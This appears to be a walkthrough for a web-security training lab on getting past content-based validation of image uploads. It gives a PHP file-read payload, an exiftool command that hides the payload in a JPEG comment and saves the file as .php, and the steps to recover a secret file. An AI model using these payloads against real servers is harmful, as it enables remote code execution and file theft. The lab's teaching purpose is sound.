## Flawed validation of the file's contents

Instead of implicitly trusting the `Content-Type` specified in a request, more secure servers try to verify that the contents of the file actually match what is expected.

In the case of an image upload function, the server might try to verify certain intrinsic properties of an image, such as its dimensions. If you try uploading a PHP script, for example, it won't have any dimensions at all. Therefore, the server can deduce that it can't possibly be an image, and reject the upload accordingly.

## Flawed validation of the file's contents - Continued

Similarly, certain file types may always contain a specific sequence of bytes in their header or footer. These can be used like a fingerprint or signature to determine whether the contents match the expected type. For example, JPEG files always begin with the bytes `FF D8 FF`.

This is a much more robust way of validating the file type, but even this isn't foolproof. Using special tools, such as **ExifTool**, it can be trivial to create a polyglot JPEG file containing malicious code within its metadata.

## Process 

1. On your system, create a file called `exploit.php` containing a script for fetching the contents of Carlos's secret. For example:
    
    ```PHP
    <?php echo file_get_contents('/home/carlos/secret'); ?>
    ```
1. Log in and attempt to upload the script as your avatar. Observe that the server successfully blocks you from uploading files that aren't images, even if you try using some of the techniques you've learned in previous labs.
2. Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata. A simple way of doing this is to download and run ExifTool from the command line as follows:
    
    ```BASH
    exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
    ```
    
    This adds your PHP payload to the image's `Comment` field, then saves the image with a `.php` extension.

4. In the browser, upload the polyglot image as your avatar, then go back to your account page.
5. In Burp's or caido's proxy history, find the `GET /files/avatars/polyglot.php` request. Use the message editor's search feature to find the `START` string somewhere within the binary image data in the response. Between this and the `END` string, you should see Carlos's secret, for example:
    
    ```WEB
    START 2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ END
    ```
6. Submit the secret to solve the lab.

--- 
